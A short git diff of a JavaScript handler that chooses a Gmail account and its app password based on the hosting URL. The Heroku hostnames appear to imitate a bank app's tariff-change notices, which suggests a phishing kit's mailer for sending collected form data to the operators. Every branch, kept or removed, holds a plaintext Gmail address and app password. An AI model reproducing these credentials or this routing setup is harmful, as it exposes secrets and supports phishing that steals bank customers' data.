@@ -41,19 +41,6 @@ export default function handler(req, res) {
         email = 'suksesk541@gmail.com'; //email
         pass = 'stpqngfmwfvsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
         
-    } else if(url == 'perubahan-tarifbrimo.herokuapp.com') //jika url sama dengan url hosting
-    {
-        email = 'besarhasil47@gmail.com'; //email
-        pass = 'srpjniuzjggqmomn'; //sandi aplikasi dari verifikasi 2 langkah
-        
-    } else if (url == 'formpilihan-tarif.herokuapp.com'){
-        email= 'barulink236@gmail.com';
-        pass = 'bopgkupysveiukmb';
-    }
-    else {
-
-        email = 'tapa89911@gmail.com';
-        pass = 'qqukcjtkxobpztko';
 
     }
         
